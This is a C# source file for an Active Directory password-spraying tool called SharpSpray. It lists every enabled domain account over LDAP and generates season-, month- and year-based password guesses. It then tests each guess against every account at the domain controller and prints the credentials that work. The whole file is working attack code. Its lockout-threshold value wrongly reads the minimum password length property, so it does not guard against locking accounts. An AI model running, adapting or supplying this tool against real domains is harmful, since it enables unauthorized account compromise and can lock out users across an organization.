using System;
using System.Linq;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Threading;

namespace SharpSpray
{
    class SharpSpray
    {
        static void Main(string[] args)
        {

            string LogonServer = Environment.GetEnvironmentVariable("LOGONSERVER").TrimStart('\\');
            if (LogonServer == null)
            {
                Console.WriteLine("[-] Failed to retrieve the LOGONSERVER the environment variable; the script will exit.");
                System.Environment.Exit(1);
            }
            
            List<string> UserList = new List<string>();
            int minPwdLength = new int();
            int lockoutThreshold = new int();
            string Seeds = null;
            string Passwords = null;
            int Delay = new int();
            int Sleep = new int();

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--Passwords")
                {
                    Passwords = args[i + 1];
                }
                else if (args[i] == "--Seeds")
                {
                    Seeds = args[i + 1];
                }
                else if (args[i] == "--Delay")
                {
                    Delay = int.Parse(args[i + 1]);
                }
                else if (args[i] == "--Sleep")
                {
                    Sleep = int.Parse(args[i + 1]);
                }
            }

            try
            {
                DirectoryEntry dEntry = new DirectoryEntry("LDAP://" + System.DirectoryServices.ActiveDirectory.ActiveDirectorySite.GetComputerSite().InterSiteTopologyGenerator.Name);
                DirectorySearcher dSearch = new DirectorySearcher(dEntry);
                dSearch.Filter = "(&(objectCategory=Person)(sAMAccountName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
                dSearch.PageSize = 1000;
                dSearch.PropertiesToLoad.Add("sAMAccountName");
                dSearch.SearchScope = SearchScope.Subtree;
                SearchResultCollection results = dSearch.FindAll();
                if (results != null)
                {
                    for (var i = 0; i < results.Count; i++)
                    {
                        UserList.Add((string)results[i].Properties["sAMAccountName"][0]);
                    }
                }
                else
                {
                    Console.WriteLine("[-] Failed to retrieve the usernames from Active Directory; the script will exit.");
                    System.Environment.Exit(1);
                }

                if (UserList != null)
                {
                    int UserCount = UserList.Count;
                    Console.WriteLine("[+] Successfully collected " + UserCount + " usernames from Active Directory.");
                    lockoutThreshold = (int)dEntry.Properties["minPwdLength"].Value;
                    Console.WriteLine("[*] The Lockout Threshold for the current domain is " + lockoutThreshold + ".");
                    minPwdLength = (int)dEntry.Properties["minPwdLength"].Value;
                    Console.WriteLine("[*] The Min Password Length for the current domain is " + minPwdLength + ".");
                }
                else
                {
                    Console.WriteLine("[-] Failed to create a list the usernames from Active Directory; the script will exit.");
                    System.Environment.Exit(1);
                }
            }
            catch
            {
                Console.WriteLine("[-] Failed to find or connect to Active Directory; the script will exit.");
                System.Environment.Exit(1);
            }

            List<string> SeedList = new List<string>();
            List<string> PasswordList = new List<string>();

            if (Passwords != null)
            {
                PasswordList = Passwords.Split(',').ToList();
            }
            else if (Seeds != null)
            {
                SeedList = Seeds.Split(',').ToList();
                PasswordList = GeneratePasswords(SeedList, minPwdLength);
            }
            else
            {
                List<string> SeasonList = new List<string>();
                List<string> MonthList = new List<string>();

                System.DateTime Today = System.DateTime.Today;
                System.DateTime Month = new DateTime(Today.Year, Today.Month, 1);

                SeasonList.Add(GetSeason(Month.AddMonths(-1)).ToString());
                SeasonList.Add(GetSeason(Month).ToString());
                SeasonList.Add(GetSeason(Month.AddMonths(1)).ToString());

                MonthList.Add(Month.AddMonths(-1).ToString("MMMM"));
                MonthList.Add(Month.ToString("MMMM"));
                MonthList.Add(Month.AddMonths(1).ToString("MMMM"));

                SeedList = SeasonList.Distinct().Concat(MonthList.Distinct()).ToList();

                PasswordList = GeneratePasswords(SeedList, minPwdLength);
            }
            if (PasswordList == null)
            {
                Console.WriteLine("[-] The PasswordList variable is empty; the script will exit.");
                System.Environment.Exit(1);
            }
            Console.WriteLine("[+] Successfully generated a list of " + PasswordList.Count + " passwords.");

            Console.WriteLine("[*] Starting password spraying operations.");
            if (Delay > 0)
            {
                Console.WriteLine("[*] Using a delay of " + Delay + " milliseonds between attempts.");
            }
            else
            {
                Console.WriteLine("[*] Using the default delay of 1000 milliseonds between attempts.");
            }

            foreach (string Password in PasswordList)
            {
                Console.WriteLine("[*] Using password " + Password);
                foreach (string UserName in UserList)
                {

                    bool Flag = false;
                    try
                    {
                        using (PrincipalContext principalContext = new PrincipalContext(ContextType.Domain, LogonServer))
                        {
                            Flag = principalContext.ValidateCredentials(UserName, Password, ContextOptions.Negotiate);
                        }
                    }
                    catch (PrincipalServerDownException)
                    {
                        Console.WriteLine("[-] Failed to retrieve the domain name; the script will exit.");
                    }

                    if (Flag == true)
                    {

                        Console.WriteLine("[+] Successfully authenticated with " + UserName + "::" + Password);
                    }
                    else
                    {
                        //Console.WriteLine("[-] Authentication failed with " + UserName + "::" + Password);
                    }

                    if (Delay > 0)
                    {
                        Thread.Sleep(Delay);
                    }
                    else
                    {
                        Thread.Sleep(1000);
                    }
                }
                Console.WriteLine("[*] Completed all rounds with password " + Password);

                if (Sleep > 0)
                {
                    int Duration = (int)TimeSpan.FromMinutes(Sleep).TotalMilliseconds;
                    Console.WriteLine("[*] Now the script will sleep for " + TimeSpan.FromMilliseconds(Duration).TotalMinutes.ToString() + " minutes.");
                    Thread.Sleep(Duration);
                }
            }
            Console.WriteLine("[*] Completed all password spraying operations.");
        }

        public static string GetSeason(DateTime Date)
        {
            System.DateTime Today = System.DateTime.Today;
            System.DateTime Winter = new System.DateTime(Today.Year, 01, 01);
            System.DateTime Spring = new System.DateTime(Today.Year, 03, 20);
            System.DateTime Summer = new System.DateTime(Today.Year, 06, 21);
            System.DateTime Autumn = new System.DateTime(Today.Year, 09, 22);
            System.DateTime Winter2 = new System.DateTime(Today.Year, 12, 21);

            if ((Date >= Winter) && (Date <= Spring))
            {
                return "Winter";
            }
            else if ((Date >= Spring) && (Date <= Summer))
            {
                return "Spring";
            }
            else if ((Date >= Summer) && (Date <= Autumn))
            {
                return "Summer";
            }
            else if ((Date >= Autumn) && (Date <= Winter2))
            {
                return "Autumn";
            }
            else if ((Date >= Winter2) && (Date <= Spring.AddYears(1)))
            {
                return "Winter";
            }
            else {
                return null;
            }
        }

        public static List<string> GeneratePasswords(List<string> SeedList, int minPwdLength)
        {
            if (SeedList != null)
            {
                List<string> PasswordList = new List<string>();
                List<string> AppendList = new List<string>();

                System.DateTime Today = System.DateTime.Today;

                AppendList.Add(Today.ToString("yy"));
                AppendList.Add(Today.ToString("yy") + "!");
                AppendList.Add(Today.ToString("yyyy"));
                AppendList.Add(Today.ToString("yyyy") + "!");
                AppendList.Add("1");
                AppendList.Add("2");
                AppendList.Add("3");
                AppendList.Add("1!");
                AppendList.Add("2!");
                AppendList.Add("3!");
                AppendList.Add("123");
                AppendList.Add("1234");
                AppendList.Add("123!");
                AppendList.Add("1234!");

                foreach (string Seed in SeedList)
                {
                    foreach (string Item in AppendList) 
                    { 
                        string Candidate = Seed + Item;
                        if (Candidate.Length >= minPwdLength)
                        {
                            PasswordList.Add(Candidate);
                        }
                    }
                }
                return PasswordList;
            }
            else
            {
                Console.WriteLine("[-] The SeedList variable is empty; the GetSeason() function will return null.");
                return null;
            }
        }

    }
}
